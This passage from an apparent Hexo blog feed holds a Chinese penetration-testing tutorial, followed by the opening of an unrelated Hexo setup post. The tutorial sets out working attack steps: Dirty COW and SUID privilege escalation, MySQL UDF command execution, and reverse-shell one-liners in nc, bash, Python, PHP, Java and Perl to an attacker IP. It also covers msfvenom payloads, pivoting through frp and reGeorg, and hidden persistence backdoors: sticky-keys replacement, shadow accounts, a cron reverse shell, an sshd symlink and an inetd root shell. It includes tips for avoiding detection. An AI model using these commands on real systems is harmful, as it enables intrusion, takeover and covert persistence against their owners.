(exp下载文件里有对应的编译说明文档）<br>运行 <code>./pwn</code><br>如果目标机没有gcc或者g++，自己没有权限也肯定不能安装。唯一的办法是在本地搭建一个和服务器内核版本相同的环境，在里面编译完成了再上传至靶机</li></ol><p>windows提权成功后在exp后接命令就是高权限运行，但是linux提权成功是返回一个shell。脚本执行后返回shell失败，可能是需要反弹shell</p><h4 id="脏牛提权实例"><a href="#脏牛提权实例" class="headerlink" title="脏牛提权实例"></a>脏牛提权实例</h4><ol><li>id查看目标机用户权限</li><li>uname -a目标机的linxu kernel&gt;&#x3D;2.6.22进行脏牛提权</li><li>寻找对应exp &#96;<a href="http://github/FireFart/dirtycow">http://github/FireFart/dirtycow</a></li><li>exp下载至目标机并编译 <code>gcc -pthread dirty.c -o dirty -lcrypt</code></li><li>完成后，销毁firefart密码文件即可恢复root<br><code>mv /tmp/passwd.bak /etc/passwd</code></li></ol><p>获取shell后将shell转换为完全交互式的TTY：<code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p><h2 id="suid提权"><a href="#suid提权" class="headerlink" title="suid提权"></a>suid提权</h2><p>此处涉及权限划分的知识。在Linux中通过权限位rwx实现文件权限管理。d目录，-普通文件。r read;w write;x execute<br><img src="https://storage.tttang.com/media/attachment/2022/10/29/34a39b9b-d6ee-46d4-b30c-e1541d6bd09a.png" class="lazyload placeholder" data-srcset="https://storage.tttang.com/media/attachment/2022/10/29/34a39b9b-d6ee-46d4-b30c-e1541d6bd09a.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="图片.png"><br>所有者-所属者-其他用户</p><ul><li>suid作用于二进制可执行程序上，当执行程序时会临时切换身份为文件所有者身份为文件所有者身份。<br><code>chmod u+s FILE\chmod 4755 FILE</code> 添加SUID权限到二进制文件（在三位数据权限前，4代表添加到SUID位）<br><code>chmod u-s FILE\chmod 0xxx FILE</code> 删除suid<br><img src="https://storage.tttang.com/media/attachment/2022/10/29/80b68f50-42f7-4a7a-aea3-ff233dc22f79.png" class="lazyload placeholder" data-srcset="https://storage.tttang.com/media/attachment/2022/10/29/80b68f50-42f7-4a7a-aea3-ff233dc22f79.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="图片.png"></li><li>文件属主为s表示设置了suid.没有x权限用大写S，表示权限无效</li></ul><p>简而言之，任何用户执行有suid的文件时，都会以第一个权限运行</p><blockquote><p>所以利用suid提权的一个小案例就是：<br>创建一个1.c文件,代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line">&gt;<span class="type">void</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">&gt;setuid(<span class="number">0</span>); <span class="meta">#root的uid=0，意味着执行后面的代码是root权限在执行</span></span><br><span class="line">&gt;system(<span class="string">&quot;su - root);#将当前环境转为root</span></span><br><span class="line"><span class="string">&gt;&#125;</span></span><br></pre></td></tr></table></figure><p>gcc 1.c -o 1编译<br>chmod u+s 1 添加suid<br>.&#x2F;1 执行<br>su - root !&#x3D;su root.su 只是切换了root身份，但shell环境依旧是普通用户，su - 用户和环境一起切换了。</p></blockquote><h2 id="linux数据库提权"><a href="#linux数据库提权" class="headerlink" title="linux数据库提权"></a>linux数据库提权</h2><p>和windows一样的，udf提权</p><ul><li>环境要求：配置中secure_file_priv&#x3D;””，<br>mysql具有root权限，具有sql语句执行权限，目录可读可写，selinux关闭</li></ul><p>先获取低权限shell,提权过程：<br><img src="https://storage.tttang.com/media/attachment/2022/10/29/f70d3b9a-84a7-46e5-be32-45cf0a28b84b.png" class="lazyload placeholder" data-srcset="https://storage.tttang.com/media/attachment/2022/10/29/f70d3b9a-84a7-46e5-be32-45cf0a28b84b.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="图片.png"></p><ol><li>查看plugin目录路径 <code>show variables like &#39;%plugin%&#39;;</code><br><code>select unhex(&#39;udf十六进制&#39;) into dumpfile &#39;usr/lib64/mysql/plugin/1.so&#39;;</code> (plugin路径&#x2F;1.so)</li><li>声明函数 <code>create function sys_eval returns string soname &#39;1.so&#39;;</code></li><li>执行高权限命令 <code>select sys_eval(&#39;whoami&#39;);</code></li><li>清除痕迹 <code>drop function sys_eval;</code></li></ol><p>windows soname动态链接库指向udf.dll，linux指向.so文件，所以声明的函数也要是.so文件里的。<br>详情请见上篇windows提权</p><h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><ul><li>反弹shell使用场景:防火墙会阻止客户端主动连接服务器，但是服务器连接客户端通过防火墙时，可以穿透到达客户端</li></ul><h2 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h2><p>netcat简称nc，被称为渗透测试中的瑞士军~~~~刀。<br>它可以用作端口监听、端口扫描、远程文件传输、远程shell等</p><ul><li><p>语法:<code>nc [-hlnruz][-g 网关][-G 指向器数目][-i 延迟秒数][-o 输出文件][-p 通信端口][-s 来源IP][-v 次数][-w 超时秒数][主机名称][通信端口...]</code></p></li><li><p>反向shell<br>假设在目标主机找到了RCE漏洞，可以在目标主机上用nc发出命令启动反向shell<br><img src="https://storage.tttang.com/media/attachment/2022/10/29/082a3402-fa0e-4082-8637-b1d5e8492103.png" class="lazyload placeholder" data-srcset="https://storage.tttang.com/media/attachment/2022/10/29/082a3402-fa0e-4082-8637-b1d5e8492103.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="图片.png"></p></li></ul><ol><li>在攻击机或vps上监听本地端口<code>nc -lvp 监听端口号</code></li><li>靶机命令，连接攻击机的监听端口<code>nc 攻击机ip 监听端口号 -e /bin/bash</code> #linux<br><code>nc 攻击机ip 监听端口号 -e c:\windows\system32\cmd.exe</code> #windows<br>-e:将bash shell 发回主机</li></ol><ul><li>正向shell<br>正向shell时在目标机使用nc将bash shell绑定到特定端口，攻击机nc连接到此端口<br> <img src="https://storage.tttang.com/media/attachment/2022/10/29/09a20387-a532-4ea8-9c1a-0c5c8a640cf9.png" class="lazyload placeholder" data-srcset="https://storage.tttang.com/media/attachment/2022/10/29/09a20387-a532-4ea8-9c1a-0c5c8a640cf9.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="图片.png"></li></ul><h3 id="bash反弹shell"><a href="#bash反弹shell" class="headerlink" title="bash反弹shell"></a><strong>bash反弹shell</strong></h3><p>目标主机可能没有nc或不支持-e参数时，就需要以下方式反弹shell</p><ul><li>攻击机监听:<code>nc -lvvp 端口</code></li><li>目标主机:<code>bash -i &gt;&amp; /dev/tcp/攻击机ip/监听端口号 0&gt;&amp;1</code></li></ul><blockquote><table><thead><tr><th>bash -i</th><th>产生一个交互式shell</th></tr></thead><tbody><tr><td>&amp;</td><td>将&amp;前后内容相结合重定向(&gt;)至后者</td></tr><tr><td>&#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port</td><td>对socket网络连接的抽象</td></tr><tr><td>0&gt;&amp;1</td><td>将标准输入和标准输入内容相结合，然后重定向至标准输出内容。0标准输入、1标准输出、2错误输出</td></tr></tbody></table></blockquote><h2 id="其他反弹shell方式"><a href="#其他反弹shell方式" class="headerlink" title="其他反弹shell方式"></a>其他反弹shell方式</h2><h3 id="python反弹shell"><a href="#python反弹shell" class="headerlink" title="python反弹shell"></a>python反弹shell</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> soket,subprocess,os;</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="string">&quot;攻击机IP&quot;</span>,监听端口号));</span><br><span class="line">os.dup(s.fileno(),<span class="number">0</span>);</span><br><span class="line">os.dup2(s.fileno(),<span class="number">1</span>);</span><br><span class="line">os.dup2(s.fileno(),<span class="number">2</span>);</span><br><span class="line">p=subprocess.call([<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-i&quot;</span>]);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="php反弹shell"><a href="#php反弹shell" class="headerlink" title="php反弹shell"></a>php反弹shell</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sock</span>=<span class="title function_ invoke__">fsockopen</span>(<span class="string">&quot;攻击机IP&quot;</span>,监听端口);</span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="string">&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="java反弹shell"><a href="#java反弹shell" class="headerlink" title="java反弹shell"></a>java反弹shell</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">r = Runtime.getRuntime()</span><br><span class="line">p = r.exec([<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;exec 5&lt;&gt;/dev/tcp/攻击机ip/监听端口;cat &lt;&amp;5 | while read line;do $line 2&gt;&amp;5&gt;&amp;5;done&quot;</span>] as String[])</span><br><span class="line">p.waitFor()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="perl-反弹shell"><a href="#perl-反弹shell" class="headerlink" title="perl 反弹shell"></a>perl 反弹shell</h3><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> Socket;</span><br><span class="line">$i=<span class="string">&quot;攻击机IP地址&quot;</span>;</span><br><span class="line">$p=监听端口号;<span class="keyword">socket</span>(S,PF_INET,SOCK_STREAM,<span class="keyword">getprotobyname</span>(<span class="string">&quot;tcp&quot;</span>));<span class="keyword">if</span>(<span class="keyword">connect</span>(S,sockaddr_in($p,inet_aton($i))))&#123;</span><br><span class="line">(<span class="keyword">open</span>(STDIN,<span class="string">&quot;&gt;&amp;S&quot;</span>);</span><br><span class="line"><span class="keyword">open</span>(STDOUT,<span class="string">&quot;&gt;&amp;S&quot;</span>);</span><br><span class="line"><span class="keyword">open</span>(STDERR,<span class="string">&quot;&gt;&amp;S&quot;</span>);</span><br><span class="line"><span class="keyword">exec</span>(<span class="string">&quot;/bin/sh -i&quot;</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>perl和python绝大多数服务器都会装，所以很有用</p><p>以某次内网渗透为实例</p><h2 id="横向渗透预备工作"><a href="#横向渗透预备工作" class="headerlink" title="横向渗透预备工作"></a>横向渗透预备工作</h2><p><img src="https://storage.tttang.com/media/attachment/2022/10/29/1636427f-bf91-4ce2-98da-c3c39213063f.png" class="lazyload placeholder" data-srcset="https://storage.tttang.com/media/attachment/2022/10/29/1636427f-bf91-4ce2-98da-c3c39213063f.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="图片.png">假设是如上拓扑图。先无视防火墙，内网机器无法直接访问外网，必须要走边界机。</p><h3 id="获得低权限shell"><a href="#获得低权限shell" class="headerlink" title="获得低权限shell"></a>获得低权限shell</h3><ul><li>在网站信息搜集看到是joomla模板</li><li>msf里search joomla <strong>查看</strong> 辅助模块auxiliar里的<strong>扫描脚本</strong>：<code>auxiliary/scannner/http/joomla_version</code></li><li>use脚本设置rhost参数，然后expolit运行可以看到网站版本。<code>expolit -j -z</code>挂后台</li><li><code>searchsplopit joomla 版本</code><strong>寻找exp</strong>，最好是在exploit.db找，这里图个方便</li><li>把脚本copy到msf的exploits&#x2F;multi&#x2F;php目录下，然后reload</li><li>use exp脚本，set rhost\rport参数和lhost\lport参数，set payload为reverse或者bind，exploit运行</li></ul><p>目前获得了低权限shell，sessions进入shell</p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><ul><li><code>uname -a</code>查看系统信息</li><li>gcc –version看到有gcc，就找c语言的脚本。另起一个终端<code>nc --lvvp 端口</code>监听新端口</li><li>shell里<code>bash -i &gt;&amp; /dev/tcp/xx.xx.xx.xx/端口 0&gt;&amp;1</code>反弹shell</li><li><code>searchspolit  linux kernel 内核版本 --exclute=&quot;(PoC)|/dos/&quot;</code>搜索本地提权脚本。除去Poc和dos，就剩本地脚本了。同理，也可以在expolit.db上找</li><li>上传脚本，但是靶机的网站根目录不可写(很少见)，写到&#x2F;tmp目录</li><li><code>gcc -o 输出文件名 脚本名</code>编译，<code>./文件名</code>运行。不行就换脚本，脚本里有使用方法，事先看一下</li></ul><p>提不了就别提了，不是非要提权(试李妈半天都提不起，不知道这些exp谁写的)</p><h3 id="一级代理"><a href="#一级代理" class="headerlink" title="一级代理"></a>一级代理</h3><ul><li>靶机<code>python reGeorgSocksProxy.py -u http://IP -p 代理端口</code>建立代理转发服务器</li><li>ipconfig或者其他的看下网段，<code>run autoroute -s 网端</code>开启路由转发</li><li><code>use auxiliary/scanner/discovery</code>、nmap、ping扫描等扫同网端存活主机</li><li>扫描端口<code>use auxiliary/scanner/portscan/tcp</code>或者nmap扫，设置一下rhost和常用端口，运行</li><li><code>vim /etc/proxychains.conf</code>配置代理，浏览器开代理访问内网网站(建议foxyProxy插件)</li></ul><p>如果开了80端口，接下来就是搞内网的站，拿内网的webshell。注意蚁剑和burpsuit等工具也要配置代理</p><p><strong>reGeorgSocksProxy指定的端口要和proxychains.conf文件里的端口一致</strong>，因为这波操作的意义就是把边界机当作跳板，regeorgsocksproxy.py在边界机起到代理服务器的作用,proxychains就是客户端</p><p>内网的站打下来了重复上述步骤到提权。</p><h3 id="二层内网渗透（bind）"><a href="#二层内网渗透（bind）" class="headerlink" title="二层内网渗透（bind）"></a>二层内网渗透（bind）</h3><ul><li>生成msf木马<code>msfvenom -p windows/meterpreter/bind_tcp lport=xxx -f exe -o 文件名</code>，因为内网不能直接连外网的原因,reverse版木马无法使用，但是我们有代理可以连内网。上传</li><li>同理，生成了木马本地就需要有msf进程监听。<code>use exploit/multi/handler</code>，然后<code>set payload windows/meterpreter/bind_tcp</code>，payload和msf木马所用payload一致，设置参数lport和rhost.（这里开监听是在边界服务器开，也就是之前msf的边界服务器终端，lport当然也是边界机的端口，相当于<del>本机msf对靶机边界机</del> 的渗透变为了&#x3D;&#x3D;靶机边界机对内网二层机&#x3D;&#x3D;)</li><li>在二层内网机提权运行msf木马拿到shell后，<code>run autoroute -s 另一内网网段</code>添加路由</li><li>扫描，老样子，那几个扫描用啥都行，<code>run arp_scanner -r 网段</code>进行arp扫描</li></ul><p>如果非要用reverse的连接方式呢，今天我皮痒，或者有防火墙只能出。<br>很简单，用到端口转发。如果将边界机监听reverse的端口转发到本地端口，二层内网机reverse到边界机的端口就相当于直接和本地通信</p><p>lcx被检测概率太大，用<strong>frp</strong></p><h4 id="二层内网渗透-frp工具reverse"><a href="#二层内网渗透-frp工具reverse" class="headerlink" title="二层内网渗透(frp工具reverse)"></a>二层内网渗透(frp工具reverse)</h4><p>关于frp要分清楚客户端和服务端到底应该放在哪。具体可以看&#x3D;&#x3D;frpc.ini&#x3D;&#x3D;和&#x3D;&#x3D;frps.ini&#x3D;&#x3D;</p><p>比如某frpc.ini的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr=172.16.12.2</span><br><span class="line">server_port=7100</span><br><span class="line">[ssh]</span><br><span class="line">type=tcp</span><br><span class="line">local_ip=127.0.0.1</span><br><span class="line">local_port=5000</span><br><span class="line">remote_port=5000</span><br></pre></td></tr></table></figure><p>如上，客户端连接服务端的7000端口，是将本机的5000端口数据以tcp转发到172.16.12.2的5000端口。因为你开frp也需要端口的嘛。这样连接服务端的5000端口就相当于连接客户端的5000端口。<br>服务端只有两行，监听一下就行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port=7100</span><br></pre></td></tr></table></figure><p>这里，我要强调本文的精华</p><h4 id="x3D-x3D-frp端口转发与内网穿透-x3D-x3D"><a href="#x3D-x3D-frp端口转发与内网穿透-x3D-x3D" class="headerlink" title="&#x3D;&#x3D;frp端口转发与内网穿透&#x3D;&#x3D;"></a>&#x3D;&#x3D;frp端口转发与内网穿透&#x3D;&#x3D;</h4><p><img src="https://storage.tttang.com/media/attachment/2022/10/29/f4087477-330a-4eef-acf2-0b6b27097858.png" class="lazyload placeholder" data-srcset="https://storage.tttang.com/media/attachment/2022/10/29/f4087477-330a-4eef-acf2-0b6b27097858.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="图片.png"></p><p><strong>还是这张图。对于外网kali访问内网机，有两种手法，一是把外网kali的端口转发至边界机的端口。这样数据发到边界机的该端口就相当于发到外网kali，而端口转发frps在边界机、frpc在外网kali。另一种方式是内网穿透，把内网流量直接穿透到外网使得内网机能上网，frps也在边界机，frpc在内网机。</strong></p><p>可以理解为都是端口转发，<strong>访问frps所在主机就相当于访问frpc</strong>，所以<strong>frps一定要在中间的机器上</strong>。逻辑理不通建议反复读来回读读通读透。有很多文章啊就不介绍端口转发和内网穿透有什么区别，整半天都不知道frps放哪，虽然只学内网穿透就够外网打内网一招鲜了。</p><p>上传frp和ini文件，运行。重新msfvenome生成一个reverse木马，lhost指向边界机 lport也是边界机要开的端口。(木马的lhost指的是需要连接的ip,不是指上传的ip)<br>上传木马到二层边界机运行，再在边界机shell里开监听(监听msf木马lport)</p><h2 id="二层代理"><a href="#二层代理" class="headerlink" title="二层代理"></a>二层代理</h2><ul><li>msf开二层代理，在刚在监听的shell里<code>use auxiliary/server/socks5</code>，然后<code>run</code>运行</li><li>对之前arp扫描的主机<code>use auxiliary/scanner/portscan/tcp</code>扫描端口，设置rhost参数，准备再往里打</li><li>配置浏览器代理，选socks5，端口和socks5脚本show options的端口一致</li><li>访问三层内网机的80端口，准备三层内网渗透(打80端口)</li></ul><p>二层渗透就搞定了。如果三层内网要出网经过二层内网。用bind的话还好，用reverse就需要用两次代理转发</p><p>简单提一下<strong>三层内网</strong>，可以上传lcx再进行一次端口转发，把二层内网机的frp端口转发到边界机，或者走frp代理。这样都是frp端口就串起来了，再把三层内网机reverse到二层的端口等于二层转发的端口，相当于直接reverse出去</p><p>所以！多层代理就是把多层主机端口串起来！</p><p>什么？拿完shell，几台机子的shell来回切你嫌麻烦？可以直接用Termite工具</p><h1 id="Termite"><a href="#Termite" class="headerlink" title="Termite"></a>Termite</h1><p>Termite用于管理多层跳板，有admin和agent两个文件。</p><ul><li>在第一个节点上传agent的对应版本，运行<code>./agent_版本 -l 端口</code></li><li>在攻击机运行<code>admin的对应版本 -c 边界机ip -p 端口</code>，连接没问题就跳ok</li><li>admin的shell里<code>goto 1</code>进入第一个节点，<code>shell 端口</code>。然后起个终端开nc或者其他监听，监听该端口，弹回了第一个shell</li><li>二层机器<code>agent对应版本 -c 上一层ip -p 上一层端口</code>。端口与前面开agent和admin的端口一致。</li></ul><p>小站权限维持大部分还是靠webshell后门，其他的可以，但没必要。还有搞站最好别在晚上搞，晚上流量少，搞站日志记录和流量占比很大。因而写的好的木马流量控制做的很好，上传和下载速度都有控制</p><h1 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h1><p>权限维持不一定是高权限。后门最好都要伪装，如启动，图标，名字。经过学习个人认为权限维持&#x3D;隐藏后门</p><h2 id="windows后门"><a href="#windows后门" class="headerlink" title="windows后门"></a>windows后门</h2><p>常见的后门：shift后门，启动项&#x2F;计划任务，映像劫持，影子账户，远控<br>大多数情况下，后门是一个隐藏进程。</p><ul><li>shift后门</li></ul><blockquote><p>windows按五下shift后，windows就运行了system32下的sethc.exe，启动粘滞键。</p><blockquote><p>将cmd.exe更名为sethc.exe并把原来的替换，之后连续按下5次shift后就会以system权限运行cmd.exe，之后只要利用cmd增加一个administator就可以登录</p></blockquote></blockquote><p>除此之外，连接上3389之后可以使用的功能不止shift，还有放大镜等可以替换。</p><ul><li>映像劫持<br>现在很难使用了，在高版本的windows版本中替换的文件受到了系统保护，所以要映像劫持。<br>a.exe实际打开是b.exe，就是劫持</li></ul><blockquote><p>映像劫持也称IFEO，是为一些在默认系统环境中运行时可能引发错误的程序执行提供特殊的环境设定。默认管理员有权读写</p><blockquote><p>映像劫持的制作过程</p></blockquote><blockquote><ol><li>在注册表中新建一个项<br>注册表位置<code>HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows NT/CurrentVersion/Image File Execution Options</code></li><li>程序中添加debugger键</li><li>键值设置为恶意程序的路径</li></ol></blockquote></blockquote><ul><li>计划任务后门<br>计划任务在win7及之前版本的操作系统中使用at命令，win8及之后使用schtasks命令</li></ul><blockquote><p>创建计划任务基本命令: <code>schtask /create /t &quot;chrom&quot; /tr cmd.exe /sc minute /mo 1</code><br>上述命令的意思为创建一个计划任务名字为chrom，执行cmd.exe每分钟执行一次。执行后门就改指向文件和执行频率</p></blockquote><ul><li>注册表自启动后门</li></ul><blockquote><p>制作过程</p><blockquote><ol><li>打开注册表<code>HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows/CurrentVersion/Run</code></li><li>添加键值REG_SZ</li><li>数据中填运行程序路径</li></ol></blockquote></blockquote><ul><li>影子账户(杀毒能杀)<br>顾名思义隐藏账户，只能通过注册表查看该用户。影子账户可以获得管理员权限且不易被发现</li></ul><blockquote><p>制作过程</p><blockquote><ol><li>创建隐藏账户<br>创建隐藏账户只需在账户名后加$符号，如<code>net user test$ 123 /add</code></li><li>修改并导出注册表</li></ol></blockquote><blockquote><blockquote><ul><li>注册表位置<code>HKEY_LOCAL_MACHINE/SAM/SAM/Domains/Account/Users/</code>，如进入SAM无法看到子选项，需要给administrators完全控制权限</li><li>将administrator用户的F值复制到test$对应F值，保存</li><li>将test$和users右键导出</li></ul></blockquote></blockquote><blockquote><ol start="3"><li>删除创建的隐藏用户<br>cmd删除test$<code>net user test$ /del</code></li><li>导入注册表<br>双击导出的两个注册表</li></ol></blockquote></blockquote><p>影子账户试了一下，还是很牛逼的。</p><h2 id="linux后门"><a href="#linux后门" class="headerlink" title="linux后门"></a>linux后门</h2><ul><li>计划任务后门(crontab后门)</li></ul><blockquote><p>crontab命令介绍<br><img src="https://storage.tttang.com/media/attachment/2022/10/29/c4aaefea-6fc3-436f-b6fa-4773a2e3d455.png" class="lazyload placeholder" data-srcset="https://storage.tttang.com/media/attachment/2022/10/29/c4aaefea-6fc3-436f-b6fa-4773a2e3d455.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="图片.png"></p><ul><li><p>crontab命令用来管理用户需要周期执行的任务。等于windows计划任务。crond进程每分钟会定期检查是否有要执行的任务，如果有则自动执行<br>通常在计划任务中添加后门，或者替换服务进程，以及反弹shell</p></li><li><p>反弹shell</p></li></ul><blockquote><ol><li>攻击机监听<code>nc -lvvp 本地端口号</code>、</li><li>目标机中设置计划任务<code>crontab -e</code><br>下列代码表示每分钟反弹一次shell到攻击机<br><code>*/1 * * * * bash -i &gt;&amp; /dev/tcp/攻击机外网ip/攻击机端口 0&gt;&amp;1</code></li></ol></blockquote></blockquote><ul><li>ssh公钥免密(常用)<br>将客户端生成的ssh公钥写道目标服务器的 ~&#x2F;.ssh&#x2F;authorized_keys中，之后客户端利用私钥完成认证即可登录。该后门易被发现</li></ul><blockquote><p>制作过程</p><blockquote><ol><li>在攻击机上生成公钥私钥对<br><code>ssh-keygen -t rsa</code></li></ol></blockquote><blockquote><blockquote><p>在中途会让输入密钥对密码，如果需要免密登录则回车跳过</p></blockquote></blockquote><blockquote><ol start="2"><li>将攻击机.ssh目录下的id_rsa.pub复制到目标服务器的<code>/root/.ssh/authorized_key</code>文件里<br><code>scp ~/.ssh/id_rsa.pub root@目标服务器IP地址:/root/.ssh/authorized_keys</code><br><img src="https://storage.tttang.com/media/attachment/2022/10/29/e20a4428-9299-4617-9f82-0bf3d3848656.png" class="lazyload placeholder" data-srcset="https://storage.tttang.com/media/attachment/2022/10/29/e20a4428-9299-4617-9f82-0bf3d3848656.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="图片.png"></li><li>在目标服务器中，将authorized_keys权限改为600<br><code>chmod 600 /root/.ssh/authorized.keys</code></li><li>尝试免密登录</li></ol></blockquote></blockquote><p>详情请见ssh登录详解</p><ul><li>ssh软连接后门<br>非常经典的后门，直接对sshd建立软连接，之后就能用任意密码登录</li></ul><blockquote><p>软连接后门的原理是利用了<strong>PAM配置</strong>文件的作用，将sshd文件软连接名称设置为su，这样应用在<strong>启动</strong>过程中会去PAM配置文件夹中寻找是否存在对应名称的配置信息，su在pam_rootok检测uid 0即认证成功，也可以使用&#x2F;<strong>etc&#x2F;pam.d中存在</strong>的其他软连接名字</p></blockquote><p>特点：1. 隐蔽性弱，rookit hunter这类防护脚本可以轻松扫到</p><ol start="2"><li>本地查看端口会暴露</li><li>能绕过一些流量监控</li></ol><blockquote><p>制作过程</p><blockquote><ol><li>创建软连接 <code>ln -sf /usr/sbin/sshd /tmp/su</code></li><li>设置监听端口。因为本地查看端口容易暴露，建议设置8080，8081伪装 <code>/tmp/su -o Port=8080</code><br>运行&#x2F;tmp&#x2F;su就等于运行&#x2F;usr&#x2F;sbin&#x2F;sshd,连不上可以nmap扫一下,有防火墙连不上</li></ol></blockquote></blockquote><ul><li>inetd&#x2F;xinetd后门(很老很老)<br>监听外部网络请求(socket)的系统守护进程<br><strong>具体工作过程</strong>：当inetd收到一个外部请求后，会到配置文件中找到实际处理它的程序，在把socket交给那个程序处理</li></ul><blockquote><p>inetd后门制作</p><blockquote><ol><li>向&#x2F;etc&#x2F;inetd.conf文件中加入一行:<code>daytime stream tcp nowait root /bin/bash bash -i</code></li><li>开启inet后用nc连接:<code>nc -lvvp 目标ip 13</code></li></ol></blockquote></blockquote><p>还有prism后门等在服务器安装软件的，极易被发现</p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
            <tag> 信息收集 </tag>
            
            <tag> 边界代理 </tag>
            
            <tag> 提权 </tag>
            
            <tag> 反弹shell </tag>
            
            <tag> 权限维持 </tag>
            
            <tag> msf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo博客搭建</title>
      <link href="/2021/11/28/hexo-bo-ke-da-jian/"/>
      <url>/2021/11/28/hexo-bo-ke-da-jian/</url>
      
        <content type="html"><![CDATA[<h1 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h1><ol><li><p>hexo d老是卡住：<code>git config --global http.proxy &#39;socks5://127.0.0.1:10086&#39;</code><br> 和<code>git config --global https.proxy &#39;socks5://127.0.0.1:10086&#39;</code>开代理</p></li><li><p>hexo d后需要等一两分钟github渲染</p></li><li><p>生成密钥<code>ssh-keygen -t rsa -C &quot;1958304602@qq.com&quot;</code>，然后一路回车，默认就行了</p></li><li><p>图片压缩软件：Caesium</p></li><li><p>报错<code>Template render error: (unknown path)</code> ，hexo转义时候发生的错误，你文章中可能出现了<code>&#123;&#123;&#125;&#125;</code>，<code>&#123;% %&#125;</code>这种hexo无法转义的字符</p></li></ol><h2 id="commit了但是workflow一直在deploy"><a href="#commit了但是workflow一直在deploy" class="headerlink" title="commit了但是workflow一直在deploy"></a>commit了但是workflow一直在deploy</h2><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230629135406086.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230629135406086.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230629135406086"></p><p>直接把github pages下线：</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230629135518254.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230629135518254.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230629135518254"></p><p>找最近一次部署成功的页面再发布一次</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230629135544231.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230629135544231.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230629135544231"></p><hr><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230629135618866.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230629135618866.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230629135618866"></p><p>再hexo clean ,hexo 